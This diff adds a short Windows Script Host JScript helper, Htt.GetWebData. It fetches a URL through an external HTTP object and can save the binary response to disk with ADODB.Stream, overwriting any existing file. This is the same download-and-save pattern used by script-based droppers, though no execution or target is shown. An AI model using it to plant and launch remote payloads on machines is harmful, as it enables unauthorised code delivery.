@@ -1,0 +1,22 @@
+(function () {
+    var Htt = {}
+        Htt.GetWebData = function (url, download, location) {
+            var streamObj = new ActiveXObject("ADODB.Stream");
+            Eng.HTTP.Open("GET", url, "false");
+            Eng.HTTP.Send();
+            if(Eng.HTTP.readystate == 4) {
+                if (download) {
+                    streamObj.Type = 1;
+                    streamObj.Open();
+                    streamObj.Write(Eng.HTTP.responseBody);
+                    streamObj.SaveToFile(location, 2);
+                    return Eng.HTTP.responseBody;
+                } else {
+                    return Eng.HTTP.responseText;
+                }
+            }
+        }
+
+    return Htt;
+}).call();
+
